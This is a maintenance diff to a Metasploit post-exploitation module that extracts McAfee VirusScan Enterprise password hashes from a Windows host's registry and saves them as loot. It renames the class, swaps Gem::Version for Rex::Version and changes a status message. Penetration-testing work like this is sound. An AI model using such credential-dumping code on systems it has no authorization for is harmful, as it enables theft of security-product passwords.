@@ -1,19 +1,17 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
-
-class Metasploit3 < Msf::Post
+class MetasploitModule < Msf::Post
   include Msf::Post::Windows::Registry
   include Msf::Auxiliary::Report
   include Msf::Post::Windows::UserProfiles
 
-  VERSION_5 = Gem::Version.new('5.0')
-  VERSION_6 = Gem::Version.new('6.0')
-  VERSION_8 = Gem::Version.new('8.0')
-  VERSION_9 = Gem::Version.new('9.0')
+  VERSION_5 = Rex::Version.new('5.0')
+  VERSION_6 = Rex::Version.new('6.0')
+  VERSION_8 = Rex::Version.new('8.0')
+  VERSION_9 = Rex::Version.new('9.0')
 
   def initialize(info = {})
     super(update_info(
@@ -84,7 +82,7 @@ class Metasploit3 < Msf::Post
         vprint_error("No McAfee VSE version key found in #{key}")
         next
       end
-      hash_map[hash] = Gem::Version.new(version)
+      hash_map[hash] = Rex::Version.new(version)
     end
     hash_map
   end
@@ -120,7 +118,7 @@ class Metasploit3 < Msf::Post
 
       # Store McAfee password hash as loot
       loot_path = store_loot('mcafee.hash', 'text/plain', session, "mcafee:#{hash}", 'mcafee_hashdump.txt', 'McAfee Password Hash')
-      print_status("McAfee VSE password hash saved in: #{loot_path}")
+      print_good("McAfee VSE password hash saved in: #{loot_path}")
     end
   end
 end
